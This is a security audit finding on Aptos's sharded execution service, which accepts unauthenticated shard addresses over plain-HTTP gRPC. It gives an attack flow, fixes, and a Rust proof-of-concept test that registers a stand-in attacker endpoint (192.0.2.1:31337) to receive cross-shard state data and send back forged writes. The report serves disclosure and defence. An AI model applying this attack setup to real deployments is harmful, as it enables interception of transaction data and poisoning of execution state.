# Audit Report

## Title
Unauthenticated Cross-Shard Communication Enables Byzantine Coordinator to Poison Execution State

## Summary
The `RemoteCrossShardClient::new()` function accepts arbitrary shard addresses without authentication or validation, allowing a Byzantine coordinator with deployment privileges to register malicious shards that can inject fake state updates and exfiltrate sensitive transaction data during sharded block execution.

## Finding Description

The remote sharded execution system contains a critical trust model violation in how shard addresses are initialized and validated. [1](#0-0) 

The `new()` function blindly accepts a `Vec<SocketAddr>` parameter and creates communication channels to all provided addresses without any verification that these addresses correspond to legitimate, authorized shards. The underlying network infrastructure provides no authentication: [2](#0-1) 

The GRPC client connects using plain HTTP without TLS or authentication. This is fundamentally different from Aptos's main network framework which implements Noise protocol handshakes with mutual authentication. [3](#0-2) 

**Attack Flow:**

1. During deployment, a compromised coordinator (or malicious operator) provides shard addresses that include attacker-controlled endpoints via CLI arguments: [4](#0-3) 

2. During sharded block execution, legitimate shards send cross-shard state updates (containing `StateKey` and `WriteOp` pairs) to all configured shards, including the malicious ones: [5](#0-4) 

3. The malicious shard receives sensitive transaction execution data (state keys, write operations) enabling information disclosure.

4. The malicious shard sends crafted `RemoteTxnWrite` messages back to legitimate shards with incorrect state values.

5. Legitimate shards apply these fake updates to their `CrossShardStateView` without validation: [6](#0-5) 

6. Transactions execute with poisoned state from the `CrossShardStateView`, leading to incorrect execution results and potential consensus divergence if different validator nodes have different shard configurations.

## Impact Explanation

This vulnerability violates the **Deterministic Execution** invariant (invariant #1) - validators with different shard configurations would produce different state roots for identical blocks.

**Critical Severity** is warranted because:
- **Consensus/Safety violations**: Different execution results across nodes breaks AptosBFT safety guarantees
- **State Consistency**: State poisoning via fake cross-shard updates violates atomic state transition guarantees (invariant #4)
- **Information Disclosure**: Transaction write sets containing sensitive state data are exfiltrated to attacker-controlled endpoints

While this is primarily a benchmarking/testing system rather than production infrastructure, the lack of authentication represents a fundamental security design flaw that would need remediation before any production deployment.

## Likelihood Explanation

**Likelihood: Low-Medium (deployment-time attack)**

The attack requires the adversary to either:
1. Be a malicious operator with deployment privileges controlling CLI arguments
2. Compromise the deployment/configuration process to inject malicious shard addresses
3. Act as a Byzantine coordinator with infrastructure control

This is not exploitable by external, unprivileged attackers. However, insider threats and supply chain attacks targeting deployment infrastructure are realistic threat vectors for blockchain systems.

## Recommendation

Implement mutual authentication and authorization for cross-shard communication:

**1. Use Aptos's existing Noise protocol authentication:**
Integrate the network framework's `NoiseUpgrader` with `HandshakeAuthMode::Mutual` to authenticate all shard connections against a trusted peer set.

**2. Add shard address validation:**
```rust
pub fn new(
    controller: &mut NetworkController, 
    shard_addresses: Vec<SocketAddr>,
    trusted_peer_keys: HashMap<SocketAddr, x25519::PublicKey>
) -> Result<Self, Error> {
    // Validate all addresses are in trusted set
    for addr in &shard_addresses {
        if !trusted_peer_keys.contains_key(addr) {
            return Err(Error::UntrustedShardAddress(*addr));
        }
    }
    // ... rest of initialization with authenticated channels
}
```

**3. Enable TLS for GRPC connections:**
Replace plain HTTP with TLS:
```rust
let conn = tonic::transport::Endpoint::new(remote_addr)?
    .tls_config(ClientTlsConfig::new())?
    .connect_lazy();
```

**4. Add runtime shard identity verification:**
Verify each incoming cross-shard message is signed by the expected shard's private key before applying state updates.

## Proof of Concept

```rust
// PoC demonstrating malicious shard registration
use std::net::{IpAddr, Ipv4Addr, SocketAddr};

#[test]
fn test_malicious_shard_injection() {
    // Attacker-controlled endpoint
    let malicious_shard = SocketAddr::new(
        IpAddr::V4(Ipv4Addr::new(192, 0, 2, 1)), // Attacker IP
        31337
    );
    
    // Mix legitimate and malicious shards
    let shard_addresses = vec![
        SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 50001), // Legitimate
        malicious_shard, // Malicious - NO VALIDATION!
        SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 50002), // Legitimate
    ];
    
    let mut controller = NetworkController::new(
        "test".to_string(),
        SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 52200),
        5000
    );
    
    // This succeeds without any validation
    let client = RemoteCrossShardClient::new(&mut controller, shard_addresses);
    
    // During execution, cross-shard messages containing StateKey and WriteOp 
    // will be sent to the malicious endpoint at 192.0.2.1:31337
    // The malicious endpoint can:
    // 1. Log all state updates for information disclosure
    // 2. Send back fake RemoteTxnWrite messages to poison state
}
```

## Notes

This vulnerability is specific to the remote sharded execution system used for benchmarking and testing. The core Aptos network framework (used for validator P2P communication) does implement proper Noise protocol authentication with anti-replay protection. The issue is that the `RemoteCrossShardClient` uses a separate, simplified networking layer (`aptos-secure-net`) that lacks these security features despite its misleading name.

The name "secure-net" refers to blocking I/O guarantees, not cryptographic security, as documented in the module: [7](#0-6)

### Citations

**File:** execution/executor-service/src/remote_cross_shard_client.rs (L22-47)
```rust
    pub fn new(controller: &mut NetworkController, shard_addresses: Vec<SocketAddr>) -> Self {
        let mut message_txs = vec![];
        let mut message_rxs = vec![];
        // Create outbound channels for each shard per round.
        for remote_address in shard_addresses.iter() {
            let mut txs = vec![];
            for round in 0..MAX_ALLOWED_PARTITIONING_ROUNDS {
                let message_type = format!("cross_shard_{}", round);
                let tx = controller.create_outbound_channel(*remote_address, message_type);
                txs.push(Mutex::new(tx));
            }
            message_txs.push(txs);
        }

        // Create inbound channels for each round
        for round in 0..MAX_ALLOWED_PARTITIONING_ROUNDS {
            let message_type = format!("cross_shard_{}", round);
            let rx = controller.create_inbound_channel(message_type);
            message_rxs.push(Mutex::new(rx));
        }

        Self {
            message_txs: Arc::new(message_txs),
            message_rxs: Arc::new(message_rxs),
        }
    }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L124-138)
```rust
    pub fn new(rt: &Runtime, remote_addr: SocketAddr) -> Self {
        Self {
            remote_addr: remote_addr.to_string(),
            remote_channel: rt
                .block_on(async { Self::get_channel(format!("http://{}", remote_addr)).await }),
        }
    }

    async fn get_channel(remote_addr: String) -> NetworkMessageServiceClient<Channel> {
        info!("Trying to connect to remote server at {:?}", remote_addr);
        let conn = tonic::transport::Endpoint::new(remote_addr)
            .unwrap()
            .connect_lazy();
        NetworkMessageServiceClient::new(conn).max_decoding_message_size(MAX_MESSAGE_SIZE)
    }
```

**File:** secure/net/src/network_controller/mod.rs (L115-126)
```rust
    pub fn create_outbound_channel(
        &mut self,
        remote_peer_addr: SocketAddr,
        message_type: String,
    ) -> Sender<Message> {
        let (outbound_sender, outbound_receiver) = unbounded();

        self.outbound_handler
            .register_handler(message_type, remote_peer_addr, outbound_receiver);

        outbound_sender
    }
```

**File:** execution/executor-service/src/main.rs (L20-24)
```rust
    #[clap(long, num_args = 1..)]
    pub remote_executor_addresses: Vec<SocketAddr>,

    #[clap(long)]
    pub coordinator_address: SocketAddr,
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/cross_shard_client.rs (L103-134)
```rust
    fn send_remote_update_for_success(
        &self,
        txn_idx: TxnIndex,
        txn_output: &OnceCell<TransactionOutput>,
    ) {
        let edges = self.dependent_edges.get(&txn_idx).unwrap();
        let write_set = txn_output
            .get()
            .expect("Committed output must be set")
            .write_set();

        for (state_key, write_op) in write_set.expect_write_op_iter() {
            if let Some(dependent_shard_ids) = edges.get(state_key) {
                for (dependent_shard_id, round_id) in dependent_shard_ids.iter() {
                    trace!("Sending remote update for success for shard id {:?} and txn_idx: {:?}, state_key: {:?}, dependent shard id: {:?}", self.shard_id, txn_idx, state_key, dependent_shard_id);
                    let message = RemoteTxnWriteMsg(RemoteTxnWrite::new(
                        state_key.clone(),
                        Some(write_op.clone()),
                    ));
                    if *round_id == GLOBAL_ROUND_ID {
                        self.cross_shard_client.send_global_msg(message);
                    } else {
                        self.cross_shard_client.send_cross_shard_msg(
                            *dependent_shard_id,
                            *round_id,
                            message,
                        );
                    }
                }
            }
        }
    }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/cross_shard_state_view.rs (L49-56)
```rust
    pub fn set_value(&self, state_key: &StateKey, state_value: Option<StateValue>) {
        self.cross_shard_data
            .get(state_key)
            .unwrap()
            .set_value(state_value);
        // uncomment the following line to debug waiting count
        // trace!("waiting count for shard id {} is {}", self.shard_id, self.waiting_count());
    }
```

**File:** secure/net/src/lib.rs (L6-16)
```rust
//! This provides a simple networking substrate between a client and server. It is assumed that all
//! operations are blocking and return only complete blocks of data. The intended use case has the
//! server blocking on read.  Upon receiving a payload during a read, the server should process the
//! payload, write a response, and then block on read again. The client should block on read after
//! performing a write. Upon errors or remote disconnections, the call (read, write) will return an
//! error to let the caller know of the event. A follow up call will result in the service
//! attempting to either reconnect in the case of a client or accept a new client in the case of a
//! server.
//!
//! Internally both the client and server leverage a NetworkStream that communications in blocks
//! where a block is a length prefixed array of bytes.
```
